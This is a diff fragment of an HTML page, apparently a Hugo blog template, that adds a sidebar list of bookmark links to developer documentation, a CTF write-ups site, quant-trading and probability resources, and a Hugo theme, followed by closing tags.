+            <a target="_blank" href="https://infosecwriteups.com/" title="ctf-infosecwriteups">ctf-infosecwriteups</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://v3.bootcss.com/components/#labels" title="bootstrap3">bootstrap3</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://learnku.com/docs/gorm/v1/query/3786#bee912" title="gorm中文文档">gorm中文文档</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://go-echarts.github.io/go-echarts/docs/bar" title="go-echarts">go-echarts</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://www.itxst.com/bootstrap-table-methods/izznveei.html" title="bootstrapTable">bootstrapTable</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://wizardforcel.gitbooks.io/python-quant-uqer/content/70.html" title="python量化交易">python量化交易</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://open.163.com/newview/movie/free?pid=VEV47V5V7&amp;mid=FEV47V8TM" title="概率论">概率论</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://www.runoob.com/markdown/md-tutorial.html" title="markdown">markdown</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://emoney.gensee.com/webcast/site/vod/play-1600ce15326b4d6e8d755e0afaf3ad2e" title="基金大师">基金大师</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="https://github.com/flysnow-org/maupassant-hugo" title="hugo主题">hugo主题</a>
+        </li>
+        
+        <li>
+            <a target="_blank" href="" title="创宇盾">创宇盾</a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
